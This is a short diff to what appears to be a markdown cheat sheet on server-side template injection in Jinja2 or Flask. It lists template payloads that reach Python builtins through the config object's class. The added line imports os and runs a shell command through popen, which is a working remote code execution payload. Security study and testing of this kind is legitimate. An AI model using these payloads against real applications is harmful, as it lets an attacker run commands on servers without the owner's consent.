@@ -37,5 +37,5 @@ if we cannot run code through subclasses, we can try and access functions' built
 ```
 {{ config.__class__.__dict__ }}, {{ request.__class__.__dict__ }} # will return a dictionary of classes, methods and functions
 {{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os") }} # returns <module 'os' from '/usr/lib/python3.10/os.py'>
-
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("whoami").read() }}
 ```
